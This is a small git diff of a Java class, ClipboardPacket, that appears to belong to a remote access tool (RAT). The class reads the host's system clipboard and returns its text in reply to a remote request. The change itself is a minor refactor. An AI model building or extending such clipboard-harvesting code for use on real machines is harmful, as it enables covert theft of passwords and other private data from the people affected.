@@ -2,6 +2,7 @@ package de.sogomn.rat.packet;
 
 import java.awt.HeadlessException;
 import java.awt.Toolkit;
+import java.awt.datatransfer.Clipboard;
 import java.awt.datatransfer.DataFlavor;
 import java.awt.datatransfer.UnsupportedFlavorException;
 import java.io.IOException;
@@ -17,6 +18,7 @@ public final class ClipboardPacket extends AbstractPingPongPacket {
 	
 	public ClipboardPacket() {
 		type = REQUEST;
+		clipboardContent = "";
 	}
 	
 	@Override
@@ -44,7 +46,8 @@ public final class ClipboardPacket extends AbstractPingPongPacket {
 		type = DATA;
 		
 		try {
-			final Object clipboardObject = Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor);
+			final Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
+			final Object clipboardObject = clipboard.getData(DataFlavor.stringFlavor);
 			
 			if (clipboardObject != null) {
 				clipboardContent = (String)clipboardObject;
